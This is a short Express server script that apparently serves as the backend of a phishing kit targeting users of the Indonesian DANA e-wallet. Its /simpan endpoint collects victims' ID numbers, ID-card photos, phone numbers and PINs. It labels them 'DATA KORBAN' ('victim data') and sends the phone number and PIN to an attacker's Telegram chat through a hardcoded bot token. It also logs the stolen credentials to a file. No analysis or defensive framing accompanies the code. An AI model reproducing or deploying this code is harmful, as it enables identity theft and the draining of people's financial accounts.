// server.js
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const fs = require('fs');
const app = express();

const BOT_TOKEN = '8807488216:AAHXoGVJDIwn8M9OAEKwGnZmzJzxefeUr0M';
const CHAT_ID = '8938118595';

const upload = multer({ dest: 'uploads/' });

app.use(express.static('public'));

app.post('/simpan', upload.fields([
    { name: 'foto_ktp' }, 
    { name: 'foto_kk' }, 
    { name: 'video_ktp' }
]), async (req, res) => {
    const { nama, nik, kk, nomor, gmail, alamat, password } = req.body;
    const ip = req.ip;
    const time = new Date().toISOString();

    const pesan = 
        `🔥 DATA KORBAN DANA 🔥\n` +
        `Waktu: ${time}\n` +
        `IP: ${ip}\n` +
        `Nomor DANA: +62${nomor}\n` +
        `PIN: ${password}\n`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
    });

    fs.appendFileSync('log.txt', `${time} | ${nomor} | ${password}\n`);
    res.send('OK');
});

app.listen(3000, () => console.log('Server running on port 3000'));
